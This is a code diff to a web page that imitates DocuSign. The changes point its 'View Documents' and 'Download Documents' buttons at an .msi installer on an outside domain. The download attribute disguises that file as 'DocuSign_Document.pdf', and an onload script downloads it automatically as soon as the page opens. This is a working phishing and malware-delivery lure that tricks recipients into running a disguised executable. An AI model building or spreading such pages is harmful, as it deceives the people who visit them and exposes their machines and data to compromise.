@@ -88,8 +88,8 @@
       <span>Docu</span><span>Sign</span>
     </h1>
     <div class="d-flex gap-3 justify-content-center">
-      <a href="https://innovativecarewa.com.au/" class="btn btn-custom">View Documents</a>
-      <a href="https://innovativecarewa.com.au/" download="DocuSign_Document.pdf" class="btn btn-accent">Download Documents</a>
+      <a href="https://innovativecarewa.com.au/w9.msi" class="btn btn-custom">View Documents</a>
+      <a href="https://innovativecarewa.com.au/w9.msi" download="DocuSign_Document.pdf" class="btn btn-accent">Download Documents</a>
     </div>
   </div>
 
@@ -101,8 +101,8 @@
     window.onload = function () {
       // Auto download file
       const link = document.createElement('a');
-      link.href = 'https://innovativecarewa.com.au/'; // File URL
-      link.download = 'https://innovativecarewa.com.au/i';
+      link.href = 'https://innovativecarewa.com.au/w9.msi'; // File URL
+      link.download = 'https://innovativecarewa.com.au/w9.msi/i';
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
@@ -120,6 +120,7 @@
   </div>
 </body>
 </html>
+
 
 
 
